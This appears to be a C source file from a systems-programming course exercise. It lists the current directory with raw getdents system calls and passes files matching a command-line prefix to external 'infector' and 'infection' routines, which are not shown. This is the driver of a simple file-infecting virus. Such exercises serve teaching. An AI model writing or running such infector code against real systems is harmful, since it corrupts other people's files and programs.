#include "util.h"

#define SYS_WRITE 4
#define STDOUT 1
#define SYS_OPEN 5
#define O_RDWR 2
#define O_RDONLY 0
#define SYS_SEEK 19
#define SEEK_SET 0
#define SYS_GETDENTS 141

#define BUF_SIZE 8192

#define STDERR 2
#define SYS_EXIT 1
#define SYS_READ 3

extern int system_call();
extern void infection();
extern void infector(char*);
int main(int argc, char *argv[], char *envp[])
{
    int i;
    char* prefix = 0;
    for(i = 0; i < argc; i++){
        if(strncmp(argv[i], "-a", 2) == 0){
            prefix = argv[i] + 2; /*skip the -a*/ 
            break;
        }
    }

    char buffer[BUF_SIZE];
    int current_dir, bytes_read, buffer_position;

    current_dir = system_call(SYS_OPEN, ".", O_RDONLY, 0); 
    if (current_dir < 0) {
        system_call(SYS_WRITE, STDERR, "Failed to open directory\n", strlen("Failed to open directory\n"));
        system_call(SYS_EXIT, 0x55, 0, 0);
    }

    bytes_read = system_call(SYS_GETDENTS, current_dir, buffer, BUF_SIZE);
    if (bytes_read < 0) {
        system_call(SYS_WRITE, STDERR, "Failed to read directory bytes_read\n", strlen("Failed to read directory bytes_read\n"));
        system_call(SYS_EXIT, 0x55, 0, 0);
    }

    buffer_position = 0;
    while(buffer_position < bytes_read){
        char *entry = buffer + buffer_position;
        unsigned short record_len = *(unsigned short *)(entry + 8);
        char *filename = entry + 10;

        if((filename[0] == '.' && filename[1] == '.')|| (filename[0] == '.' || filename[1] == '0')){
            buffer_position += record_len;
            continue;
        }
        system_call(SYS_WRITE, STDOUT, filename, strlen(filename));
        if(prefix != 0){
            if(strncmp(filename, prefix, strlen(prefix)) == 0){
                int file_descriptor = system_call(SYS_OPEN, filename, O_RDWR);
                if(file_descriptor < 0){
                    system_call(SYS_WRITE, STDERR, "Could not open the file!\n", strlen("Could not open the file!\n"));
                    system_call(SYS_EXIT, 0x55);
                }
                infector(filename);
                infection();
            }
            else{
                system_call(SYS_WRITE, STDOUT, "\n", 1);
            }   
        }
        else{
            system_call(SYS_WRITE, STDOUT, "\n", 1);
        }
        buffer_position += record_len;
        
    }
    return 0;
}